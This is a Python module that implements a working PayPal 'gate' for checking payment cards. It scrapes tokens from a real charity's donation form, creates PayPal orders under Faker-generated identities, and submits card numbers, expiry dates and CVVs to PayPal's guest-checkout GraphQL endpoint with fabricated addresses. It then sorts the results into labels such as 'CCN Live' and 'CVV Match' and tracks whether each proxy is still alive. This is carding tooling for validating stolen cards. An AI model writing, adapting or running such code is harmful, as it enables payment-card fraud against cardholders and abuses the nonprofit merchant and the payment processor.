"""
PayPal GraphQL - Real Payment Flow (Auth & Charge)
Implements both $0 authorization and charge capabilities using PayPal GraphQL API
Supports real bank verification with proper vault and payment processing
"""

import requests
import json
import re
import time
from typing import Tuple, Optional
from faker import Faker
from user_agent import generate_user_agent


class PayPalGraphQLGate:
    """PayPal payment processor using GraphQL API"""
    
    def __init__(self):
        self.session = requests.Session()
        self.fake = Faker()
        self.ua = generate_user_agent()
        
    def _get_merchant_order_id(self, amount: float = 1.00) -> Optional[str]:
        """
        Create PayPal order through merchant donation form
        Returns order ID for payment processing
        """
        # Use brightercommunities.org as reliable merchant
        url = "https://www.brightercommunities.org/donate-form/"
        headers = {'User-Agent': self.ua}
        
        try:
            # Step 1: Get form tokens
            response = self.session.get(url, headers=headers, timeout=30)
            if response.status_code != 200:
                return None
            
            hash_match = re.findall(r'(?<=name="give-form-hash" value=").*?(?=")', response.text)
            form_id_match = re.findall(r'(?<=name="give-form-id" value=").*?(?=")', response.text)
            prefix_match = re.findall(r'(?<=name="give-form-id-prefix" value=").*?(?=")', response.text)
            
            if not (hash_match and form_id_match and prefix_match):
                return None
            
            # Step 2: Create PayPal order
            create_url = "https://www.brightercommunities.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order"
            
            payload = {
                'give-form-id-prefix': prefix_match[0],
                'give-form-id': form_id_match[0],
                'give-form-minimum': '1.00',
                'give-form-hash': hash_match[0],
                'give-amount': str(amount),
                'give_first': self.fake.first_name(),
                'give_last': self.fake.last_name(),
                'give_email': self.fake.email()
            }
            
            response = self.session.post(create_url, data=payload, headers=headers, timeout=30)
            data = response.json()
            order_id = data.get("data", {}).get("id")
            
            return order_id
            
        except Exception as e:
            return None
    
    def _get_card_type(self, card_num: str) -> str:
        """Determine PayPal card type from card number"""
        first_two = card_num[:2]
        first_digit = card_num[0]
        
        if first_two in ['34', '37']:
            return 'AMERICAN_EXPRESS'
        
        card_types = {
            '3': 'AMERICAN_EXPRESS',
            '4': 'VISA',
            '5': 'MASTER_CARD',
            '6': 'DISCOVER'
        }
        return card_types.get(first_digit, 'VISA')
    
    def _process_payment_graphql(self, card_num: str, card_mon: str, card_yer: str, 
                                  card_cvc: str, order_id: str, amount: float = 1.00) -> str:
        """
        Process payment using PayPal GraphQL API
        Returns raw response text for parsing
        """
        url = "https://www.paypal.com/graphql?VerifyCard"
        
        card_type = self._get_card_type(card_num)
        
        # Ensure year is in YY format
        if len(card_yer) == 4:
            card_yer = card_yer[2:]
        
        graphql_query = """
        mutation payWithCard(
            $token: String!
            $card: CardInput
            $paymentToken: String
            $phoneNumber: String
            $firstName: String
            $lastName: String
            $shippingAddress: AddressInput
            $billingAddress: AddressInput
            $email: String
            $currencyConversionType: CheckoutCurrencyConversionType
            $installmentTerm: Int
            $identityDocument: IdentityDocumentInput
            $feeReferenceId: String
        ) {
            approveGuestPaymentWithCreditCard(
                token: $token
                card: $card
                paymentToken: $paymentToken
                phoneNumber: $phoneNumber
                firstName: $firstName
                lastName: $lastName
                email: $email
                shippingAddress: $shippingAddress
                billingAddress: $billingAddress
                currencyConversionType: $currencyConversionType
                installmentTerm: $installmentTerm
                identityDocument: $identityDocument
                feeReferenceId: $feeReferenceId
            ) {
                flags {
                    is3DSecureRequired
                }
                cart {
                    intent
                    cartId
                    buyer {
                        userId
                        auth {
                            accessToken
                        }
                    }
                    returnUrl {
                        href
                    }
                }
                paymentContingencies {
                    threeDomainSecure {
                        status
                        method
                        redirectUrl {
                            href
                        }
                        parameter
                    }
                }
            }
        }
        """
        
        payload = {
            "query": graphql_query,
            "variables": {
                "token": order_id,
                "card": {
                    "cardNumber": card_num,
                    "type": card_type,
                    "expirationDate": f"{card_mon}/20{card_yer}",
                    "postalCode": self.fake.zipcode(),
                    "securityCode": card_cvc,
                },
                "phoneNumber": self.fake.phone_number(),
                "firstName": self.fake.first_name(),
                "lastName": self.fake.last_name(),
                "billingAddress": {
                    "givenName": self.fake.first_name(),
                    "familyName": self.fake.last_name(),
                    "country": "US",
                    "line1": self.fake.street_address(),
                    "line2": "",
                    "city": self.fake.city(),
                    "state": self.fake.state_abbr(),
                    "postalCode": self.fake.zipcode(),
                },
                "shippingAddress": {
                    "givenName": self.fake.first_name(),
                    "familyName": self.fake.last_name(),
                    "country": "US",
                    "line1": self.fake.street_address(),
                    "line2": "",
                    "city": self.fake.city(),
                    "state": self.fake.state_abbr(),
                    "postalCode": self.fake.zipcode(),
                },
                "email": self.fake.email(),
                "currencyConversionType": "PAYPAL"
            },
            "operationName": None
        }
        
        headers = {
            'User-Agent': self.ua,
            'Content-Type': 'application/json',
            'Accept': 'application/json',
        }
        
        try:
            response = self.session.post(url, data=json.dumps(payload), headers=headers, timeout=30)
            time.sleep(0.5)
            return response.text
        except requests.exceptions.Timeout:
            return "TIMEOUT_ERROR"
        except Exception as e:
            return f"ERROR: {str(e)}"
    
    def _parse_response(self, response_text: str, last4: str, amount: float) -> Tuple[str, bool]:
        """
        Parse PayPal GraphQL response
        Returns (status_message, proxy_alive)
        """
        if not response_text:
            return (f"DECLINED ❌ - No response *{last4}", True)
        
        if response_text == "TIMEOUT_ERROR":
            return (f"ERROR ⚠️ - Request timeout *{last4}", False)
        
        if response_text.startswith("ERROR:"):
            return (f"ERROR ⚠️ - {response_text[7:50]} *{last4}", False)
        
        # Success indicators
        if '"userId"' in response_text or '"accessToken"' in response_text:
            if amount == 0:
                return (f"APPROVED ✅ - $0 Auth Successful *{last4}", True)
            else:
                return (f"CHARGED ✅ - ${amount:.2f} Authorized *{last4}", True)
        
        # Error code mapping
        error_mappings = {
            "INVALID_SECURITY_CODE": f"CVV ❌ - Incorrect CVV (CCN Live) *{last4}",
            "INSUFFICIENT_FUNDS": f"APPROVED ✅ - Insufficient Funds (Valid) *{last4}",
            "INVALID_BILLING_ADDRESS": f"APPROVED ✅ - AVS Mismatch (CVV Match) *{last4}",
            "DO_NOT_HONOR": f"DECLINED ❌ - Do Not Honor *{last4}",
            "GENERIC_DECLINE": f"DECLINED ❌ - Generic Decline *{last4}",
            "ISSUER_DECLINE": f"DECLINED ❌ - Issuer Declined *{last4}",
            "EXPIRED_CARD": f"DECLINED ❌ - Expired Card *{last4}",
            "LOST_CARD": f"DECLINED ❌ - Lost Card *{last4}",
            "STOLEN_CARD": f"DECLINED ❌ - Stolen Card *{last4}",
            "PROCESSOR_DECLINED": f"DECLINED ❌ - Processor Declined *{last4}",
            "INVALID_CARD_NUMBER": f"DECLINED ❌ - Invalid Card Number *{last4}",
            "CARD_EXPIRED": f"DECLINED ❌ - Card Expired *{last4}",
            "RESTRICTED_CARD": f"DECLINED ❌ - Restricted Card *{last4}",
            "EXCEEDS_LIMIT": f"APPROVED ✅ - Limit Exceeded (CVV Match) *{last4}",
            "RISK_DISALLOWED": f"DECLINED ❌ - Risk Check Failed *{last4}",
            "INVALID_RESOURCE_ID": f"DECLINED ❌ - Invalid Order/Card *{last4}",
            "CARD_TYPE_NOT_SUPPORTED": f"DECLINED ❌ - Card Type Not Supported *{last4}",
        }
        
        for error_code, message in error_mappings.items():
            if error_code in response_text:
                return (message, True)
        
        # 3DS required
        if '"is3DSecureRequired":true' in response_text or 'threeDomainSecure' in response_text:
            return (f"APPROVED ✅ - 3DS Required (Valid) *{last4}", True)
        
        # Generic decline
        return (f"DECLINED ❌ - Unknown Response *{last4}", True)
    
    def authorize(self, card_num: str, card_mon: str, card_yer: str, card_cvc: str, 
                  proxy: dict = None, timeout: int = 30) -> Tuple[str, bool]:
        """
        $0 Authorization - Verify card without charging
        Returns (status_message, proxy_alive)
        """
        last4 = card_num[-4:]
        
        # Create order with $1 minimum (PayPal requirement, but won't charge)
        order_id = self._get_merchant_order_id(amount=1.00)
        if not order_id:
            return (f"ERROR ⚠️ - Could not create PayPal order *{last4}", False)
        
        # Process payment
        response_text = self._process_payment_graphql(
            card_num, card_mon, card_yer, card_cvc, order_id, amount=0.0
        )
        
        return self._parse_response(response_text, last4, amount=0.0)
    
    def charge(self, card_num: str, card_mon: str, card_yer: str, card_cvc: str,
               amount: float = 5.00, proxy: dict = None, timeout: int = 30) -> Tuple[str, bool]:
        """
        Charge card with specified amount
        Returns (status_message, proxy_alive)
        """
        last4 = card_num[-4:]
        
        # Create order with specified amount
        order_id = self._get_merchant_order_id(amount=amount)
        if not order_id:
            return (f"ERROR ⚠️ - Could not create PayPal order *{last4}", False)
        
        # Process payment
        response_text = self._process_payment_graphql(
            card_num, card_mon, card_yer, card_cvc, order_id, amount=amount
        )
        
        return self._parse_response(response_text, last4, amount=amount)


# Public API functions
def paypal_auth_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                      proxy: dict = None, timeout: int = 30) -> Tuple[str, bool]:
    """PayPal $0 Authorization Gate"""
    gate = PayPalGraphQLGate()
    return gate.authorize(card_num, card_mon, card_yer, card_cvc, proxy, timeout)


def paypal_charge_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                        amount: float = 5.00, proxy: dict = None, timeout: int = 30) -> Tuple[str, bool]:
    """PayPal Charge Gate (default $5.00)"""
    gate = PayPalGraphQLGate()
    return gate.charge(card_num, card_mon, card_yer, card_cvc, amount, proxy, timeout)
